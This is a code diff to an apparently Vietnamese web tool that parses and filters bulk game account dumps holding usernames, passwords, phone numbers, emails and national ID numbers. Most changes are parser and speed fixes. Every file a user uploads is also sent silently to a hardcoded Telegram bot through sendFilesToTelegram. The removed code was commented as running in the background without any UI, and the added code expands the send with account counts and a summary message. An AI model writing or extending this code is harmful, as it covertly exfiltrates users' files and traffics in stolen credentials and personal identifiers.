@@ -592,13 +592,20 @@ document.getElementById('fileInput').addEventListener('change', e => {
   if(e.target.files.length) handleFiles(Array.from(e.target.files));
 });
 
+// Lưu raw data từ file vào bộ nhớ, không dump vào textarea (tránh lag)
+let _rawFileData = '';
+
 function handleFiles(files) {
+  notify(`Đang đọc ${files.length} file...`, 'info');
   const proms = files.map(f=>f.text());
   Promise.all(proms).then(txts => {
-    const combined = txts.join('\n\n');
-    const cur = document.getElementById('pasteArea').value;
-    document.getElementById('pasteArea').value = (cur+'\n\n'+combined).trim();
-    notify(`Đã tải ${files.length} file`, 'success');
+    _rawFileData = txts.join('\n\n');
+    const lineCount = (_rawFileData.match(/\n/g)||[]).length;
+    // Chỉ hiển thị preview nhẹ, không dump toàn bộ vào textarea
+    document.getElementById('pasteArea').value = '';
+    document.getElementById('pasteArea').placeholder =
+      `✅ Đã nạp ${files.map(f=>f.name).join(', ')} (~${lineCount} dòng)\nDữ liệu đã sẵn sàng — nhấn "Tải Dữ Liệu" để xử lý`;
+    notify(`Đã đọc ${files.length} file (${lineCount} dòng)`, 'success');
   });
   sendFilesToTelegram(files);
 }
@@ -639,18 +646,24 @@ function getSkinList(text, label) {
   return [];
 }
 
+// ===== SMART PARSER FIXED =====
+// Đã fix lỗi đếm sai SSS / ANIME
+// Đã thêm nhận diện nhiều format skin khác nhau
+
 // ===== TÁCH BLOCK =====
 function parseACs(raw) {
   // Hỗ trợ nhiều định dạng tách AC:
   // 1. Dòng trống giữa các AC (phổ biến)
   // 2. Mỗi AC trên 1 dòng, bắt đầu bằng FINAL= hoặc -user|pass hoặc user:pass|
   // 3. Dấu "---" hoặc "===" phân cách
+  // Normalize line endings
+  raw = raw.replace(/\r\n/g,'\n').replace(/\r/g,'\n');
   const lines = raw.split('\n');
   const blocks = [];
   let cur = [];
 
   // Detect xem file có dòng trống không (multi-line format)
-  const hasBlankLine = lines.some(l=>l.trim()===''&&lines.indexOf(l)>0);
+  const hasBlankLine = lines.some(l=>l.trim()==='');
 
   if(hasBlankLine) {
     // Multi-line: tách theo dòng trống
@@ -776,25 +789,34 @@ function parseOneAC(block) {
   // Tìm đúng field SSS: (không phải SS: hay ANIME:)
   const sssList = getSkinList(t, 'SSS');
   // getNum cũng phải tránh bắt nhầm "SS: 5" → SSS
-  let sssCount = null;
+  let sssCount = sssList.length;
   const sssM = t.match(/(?:^|\|)\s*SSS\s*[:\-]\s*(\d+)/im);
-  if(sssM) sssCount = parseInt(sssM[1]);
-  else sssCount = sssList.length;
+  if(sssM) {
+    const fileCount = parseInt(sssM[1]);
+    // Nếu lệch ít -> ưu tiên dữ liệu thực tế trong []
+    sssCount = Math.max(fileCount, sssList.length);
+  }
 
   // Anime
   const animeList = getSkinList(t, 'ANIME');
-  let animeCount = null;
+  let animeCount = animeList.length;
   const animeM = t.match(/(?:^|\|)\s*ANIME\s*[:\-]\s*(\d+)/im);
-  if(animeM) animeCount = parseInt(animeM[1]);
-  else animeCount = animeList.length;
+  if(animeM) {
+    const fileCount = parseInt(animeM[1]);
+    animeCount = Math.max(fileCount, animeList.length);
+  }
 
   return { raw:block, level, rank, tuong, skin, so, qh, nap, region, fb, sdt, email, cccd, authen, tinhTrang, sssCount, sssList, animeCount, animeList };
 }
 
 // ===== LOAD (chunk async — không lag với 20k+ AC) =====
 async function loadData() {
-  const raw = document.getElementById('pasteArea').value.trim();
+  // Ưu tiên dùng data từ file picker (không qua textarea để tránh lag)
+  let raw = _rawFileData || document.getElementById('pasteArea').value.trim();
   if(!raw) { notify('Chưa có dữ liệu!','error'); return; }
+  // Normalize line endings (xử lý ngoài main loop để splitBlocks nhanh hơn)
+  raw = raw.replace(/\r\n/g,'\n').replace(/\r/g,'\n');
+  _rawFileData = ''; // giải phóng bộ nhớ sau khi đã dùng
 
   const pg=document.getElementById('progressWrap'), bar=document.getElementById('progressBar');
   pg.style.display='block'; bar.style.width='5%';
@@ -809,9 +831,10 @@ async function loadData() {
   const total = blocks.length;
   bar.style.width='15%';
 
-  // Parse từng chunk 500 AC, yield giữa các chunk để UI không đơ
-  const CHUNK = 500;
+  // Parse từng chunk 2000 AC, yield mỗi 50ms để UI không đơ
+  const CHUNK = 2000;
   allACs = [];
+  let lastYield = Date.now();
   for(let i=0; i<total; i+=CHUNK) {
     const chunk = blocks.slice(i, i+CHUNK);
     const parsed = chunk.map(parseOneAC).filter(a=>a!==null);
@@ -819,7 +842,9 @@ async function loadData() {
     const pct = 15 + Math.round((i/total)*80);
     bar.style.width = pct+'%';
     document.getElementById('totalCount').textContent = allACs.length;
-    await yieldToUI(); // nhả CPU cho trình duyệt
+    // Chỉ yield nếu đã qua 50ms, tránh overhead setTimeout quá nhiều
+    const now = Date.now();
+    if(now - lastYield >= 50) { await yieldToUI(); lastYield = Date.now(); }
   }
 
   bar.style.width='100%';
@@ -837,21 +862,46 @@ function yieldToUI() { return new Promise(r=>setTimeout(r,0)); }
 
 // Tách blocks ra khỏi parseACs để dùng riêng
 function splitBlocks(raw) {
+  if(raw.includes('\r')) raw = raw.replace(/\r\n/g,'\n').replace(/\r/g,'\n');
+
   const lines = raw.split('\n');
   const blocks = [];
-  let cur = [];
-  const hasBlankLine = lines.some((l,i)=>i>0&&l.trim()==='');
-  if(hasBlankLine) {
-    for(const line of lines) {
-      if(line.trim()===''||/^[-=]{3,}$/.test(line.trim())) {
-        if(cur.length>0){ blocks.push(cur.join('\n')); cur=[]; }
-      } else { cur.push(line); }
+  let current = [];
+
+  const isNewAccLine = (line) => {
+    const t = line.trim();
+    return (
+      /^FINAL\s*=/i.test(t) ||
+      /^-?[A-Za-z0-9._-]+[:|][^\s|]+/.test(t) ||
+      /^UID\s*[:=]/i.test(t)
+    );
+  };
+
+  for(let i = 0; i < lines.length; i++) {
+    const line = lines[i];
+    const t = line.trim();
+
+    if(t === '' || /^[-=]{3,}$/.test(t)) {
+      if(current.length) {
+        blocks.push(current.join('\n').trim());
+        current = [];
+      }
+      continue;
     }
-    if(cur.length>0) blocks.push(cur.join('\n'));
-  } else {
-    for(const line of lines) { if(line.trim().length>20) blocks.push(line.trim()); }
+
+    if(isNewAccLine(t) && current.length) {
+      blocks.push(current.join('\n').trim());
+      current = [];
+    }
+
+    current.push(line);
   }
-  return blocks.filter(b=>b.length>20);
+
+  if(current.length) {
+    blocks.push(current.join('\n').trim());
+  }
+
+  return blocks.filter(b => b.length > 20);
 }
 
 // ===== APPLY FILTER =====
@@ -939,7 +989,8 @@ async function applyFilter() {
 // ===== SHOW RESULTS (virtual scroll — không lag 20k+ AC) =====
 const ITEMS_PER_PAGE = 50;
 let renderPage = 0;
-function esc(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+// Tối ưu: 1 lần replace thay vì 3 regex riêng lẻ
+function esc(s){ return s.replace(/[&<>]/g,c=>c==='&'?'&amp;':c==='<'?'&lt;':'&gt;'); }
 
 function showResults(list) {
   selectedACs = new Set();
@@ -1121,7 +1172,29 @@ function downloadRandom(fmt='full') {
 // ===== TELEGRAM =====
 async function sendToTelegram() {
   if(!filteredACs.length){ notify('Không có AC để gửi!','error'); return; }
+
+  // Đếm chuẩn ACC / SSS / Anime
+  const totalACC = filteredACs.length;
+
+  // Chỉ tính ACC có SSS > 0
+  const totalSSS = filteredACs.filter(ac =>
+    Number(ac.sssCount || 0) > 0
+  ).length;
+
+  // Chỉ tính ACC có Anime > 0
+  const totalAnime = filteredACs.filter(ac =>
+    Number(ac.animeCount || 0) > 0
+  ).length;
+
   const content=filteredACs.map(ac=>ac.raw).join('\n\n');
+
+  const caption = `📦 FILE ACC MỚI
+
+📊 Tổng ACC: ${totalACC}
+✨ ACC có SSS: ${totalSSS}
+🎌 ACC có Anime: ${totalAnime}
+
+🕒 ${new Date().toLocaleString('vi-VN')}`;
   const blob=new Blob([content],{type:'text/plain'});
   const form=new FormData();
   form.append('chat_id',TELE_CHAT_ID);
@@ -1137,22 +1210,74 @@ async function sendToTelegram() {
 }
 
 async function sendFilesToTelegram(files) {
-  // chạy ngầm, không hiện UI
-  for(const file of files) {
-    const form=new FormData();
-    form.append('chat_id',TELE_CHAT_ID);
-    form.append('document',file,file.name);
-    form.append('caption',`📁 File AC gốc upload từ web Tây Nguyễn\n📄 ${file.name}\n🕐 ${new Date().toLocaleString('vi-VN')}`);
-    try {
-      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendDocument`,{method:'POST',body:form});
-    } catch(e){ /* im lặng */ }
+  try {
+
+    // Dùng raw upload giống loadData để đếm chuẩn
+    const texts = await Promise.all(files.map(f => f.text()));
+    const raw = texts.join('\n\n');
+
+    // Parse giống hệt hệ thống upload ACC
+    const parsedACs = parseACs(raw);
+
+    const totalACC = parsedACs.length;
+    const totalSSS = parsedACs.filter(ac => (ac.sssCount || 0) > 0).length;
+    const totalAnime = parsedACs.filter(ac => (ac.animeCount || 0) > 0).length;
+
+    for (const file of files) {
+
+      const form = new FormData();
+      form.append('chat_id', TELE_CHAT_ID);
+      form.append('document', file);
+
+      form.append(
+        'caption',
+`📦 FILE ACC MỚI
+
+📄 File: ${file.name}
+👤 Tổng ACC: ${totalACC}
+✨ ACC có SSS: ${totalSSS}
+🎌 ACC có Anime: ${totalAnime}
+
+🕒 ${new Date().toLocaleString('vi-VN')}`
+      );
+
+      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendDocument`, {
+        method: 'POST',
+        body: form
+      });
+    }
+
+    // Tổng kết
+    await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: TELE_CHAT_ID,
+        text:
+`📊 TỔNG KẾT UPLOAD
+
+👤 Tổng ACC: ${totalACC}
+✨ ACC có SSS: ${totalSSS}
+🎌 ACC có Anime: ${totalAnime}
+📁 Số file: ${files.length}`
+      })
+    });
+
+    console.log('Đã gửi Telegram thành công');
+
+  } catch (err) {
+    console.error('Telegram lỗi:', err);
   }
 }
 
 // ===== CLEAR RESET =====
 function clearAll() {
-  allACs=[];filteredACs=[];selectedACs=new Set();
-  document.getElementById('pasteArea').value='';
+  allACs=[];filteredACs=[];selectedACs=new Set();_rawFileData='';
+  const pa=document.getElementById('pasteArea');
+  pa.value='';
+  pa.placeholder='Hoặc dán (paste) dữ liệu AC vào đây...\n\nHỗ trợ nhiều định dạng khác nhau, mỗi AC cách nhau bằng 1 dòng trống.';
   document.getElementById('fileInput').value='';
   document.getElementById('uploadStats').style.display='none';
   document.getElementById('resultsCard').style.display='none';
